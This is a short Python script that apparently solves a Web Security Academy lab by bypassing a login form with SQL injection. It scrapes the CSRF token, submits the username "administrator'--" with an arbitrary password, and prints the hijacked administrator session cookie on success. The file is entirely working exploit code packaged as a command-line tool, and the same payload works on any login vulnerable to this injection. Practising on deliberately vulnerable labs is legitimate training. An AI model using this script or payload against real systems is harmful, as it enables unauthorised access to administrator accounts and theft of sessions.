import sys
import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter, Retry



def bypass_login(url, session):
    response = session.get(f"{url}/login")
    if response.status_code == 200:
        cookies = response.cookies.values()[0]

        # extracting csrf token
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "csrf"})["value"]

        data = {
            "csrf": csrf_token,
            "username": "administrator'--",
            "password": "random"
        }

        login_response = session.post(data=data, url=f'{url}/login', cookies={"session": cookies}, allow_redirects=False, timeout=10)
        if login_response.status_code == 302:
            cookies = login_response.cookies.values()[0]
            return cookies

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

        cookies = bypass_login(url, session)
        if cookies:
            print(f"(+) Successfully authenticated as the Administrator user. \n(+) Session cookie: session={cookies}")
        else:
            print("(-) Something went wrong. Please check your URL and try again.")

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")


if __name__ == "__main__":
    main()
